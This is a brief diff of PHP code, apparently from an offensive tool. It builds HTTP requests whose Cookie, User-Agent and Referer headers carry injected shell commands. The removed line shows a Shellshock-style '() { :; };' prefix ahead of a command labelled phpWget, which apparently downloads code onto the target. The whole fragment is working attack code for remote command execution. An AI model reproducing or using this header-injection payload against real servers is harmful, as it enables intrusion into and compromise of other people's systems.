@@ -241,7 +241,7 @@ if(function_exists('file_get_contents'))
 	$opts = array(
 				'http'=>array(
 					'method'	=> "GET",
-					'header'	=> "Accept-language: en\r\nCookie: var=() { :; };".strFullCmd(strCmd('phpWget.1'),$lvl)."\r\n",
+					'header'	=> "Accept-language: en\r\nCookie: var=".strFullCmd(strCmd('phpWget.1'),$lvl)."\r\n",
 					'useragent'	=> "var=".strFullCmd(strCmd('phpWget.2'),$lvl), 
 					'referer'	=> "var=".strFullCmd(strCmd('phpWget.3'),$lvl)		
 					)
